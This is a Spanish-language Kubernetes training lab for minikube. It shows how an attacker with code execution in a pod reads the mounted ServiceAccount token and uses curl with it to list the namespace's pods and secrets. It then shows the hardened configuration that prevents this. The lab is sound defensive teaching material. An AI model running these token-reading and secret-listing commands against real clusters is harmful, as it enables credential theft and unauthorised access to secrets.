# Lab 1: Token de ServiceAccount Expuesto

## Objetivo

Demostrar como un atacante con RCE (Remote Code Execution) en un contenedor puede
leer el token del ServiceAccount montado automaticamente y usarlo para acceder al
API Server de Kubernetes.

| Propiedad        | Valor                                    |
|------------------|------------------------------------------|
| **Namespace**    | `lab1-token`                             |
| **Ataque**       | RCE -> leer token -> acceder al API      |
| **Defensa**      | `automountServiceAccountToken: false`    |
| **Dificultad**   | Basica                                   |

---

## Requisitos

- minikube corriendo (`minikube start`)
- kubectl configurado

---

### Paso 1 — Desplegar la configuracion vulnerable

```bash
# Crear el namespace y el pod vulnerable
kubectl apply -f vulnerable-pod.yaml

# Crear el Role y RoleBinding que da acceso a secrets
kubectl apply -f role-binding-vulnerable.yaml

# Verificar que el pod esta corriendo
kubectl get pods -n lab1-token
```

### Paso 2 — Explotar: Leer el token del ServiceAccount

```bash
# Entrar al pod vulnerable
kubectl exec -it app-vulnerable -n lab1-token -- bash

# Dentro del pod: verificar que el token esta montado
ls -la /var/run/secrets/kubernetes.io/serviceaccount/
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### Paso 3 — Usar el token para acceder al API Server

```bash
# Dentro del pod: guardar variables
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
APISERVER="https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT"

# Listar pods en el namespace
curl -sk $APISERVER/api/v1/namespaces/lab1-token/pods \
  -H "Authorization: Bearer $TOKEN" | head -50

# Listar SECRETS del namespace (critico!)
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets \
  -H "Authorization: Bearer $TOKEN"
```

### Paso 4 — Verificar el impacto

```bash
# Dentro del pod: decodificar secrets encontrados
curl -sk $APISERVER/api/v1/namespaces/lab1-token/secrets \
  -H "Authorization: Bearer $TOKEN" | grep -o '"[^"]*"' | head -20

# Salir del pod
exit
```

---

## Parte 2: Escenario Seguro (Blue Team)

### Paso 1 — Limpiar el escenario vulnerable

```bash
kubectl delete -f role-binding-vulnerable.yaml
kubectl delete -f vulnerable-pod.yaml
```

### Paso 2 — Desplegar la configuracion segura

```bash
kubectl apply -f secure-pod.yaml

# Verificar que el pod esta corriendo
kubectl get pods -n lab1-token
```

### Paso 3 — Verificar que el token NO esta montado

```bash
kubectl exec -it app-secure -n lab1-token -- sh

# Dentro del pod: intentar leer el token
ls /var/run/secrets/
# Resultado: directorio NO existe

# Intentar acceder al API Server
curl -sk https://kubernetes.default.svc/api/v1/namespaces
# Resultado: 403 Forbidden (sin credenciales)

exit
```

---

## Diferencias Clave

| Aspecto                        | Vulnerable              | Seguro                            |
|--------------------------------|-------------------------|-----------------------------------|
| `automountServiceAccountToken` | `true` (default)        | `false`                           |
| ServiceAccount                 | `default`               | SA dedicado sin permisos          |
| SecurityContext                | Ninguno (root)          | non-root, readOnly, drop ALL      |
| Imagen                         | `nginx:1.25`            | `nginxinc/nginx-unprivileged:1.25`|
| Recursos                       | Sin limites             | CPU/memoria limitados             |

---

## Limpieza

```bash
kubectl delete namespace lab1-token
```
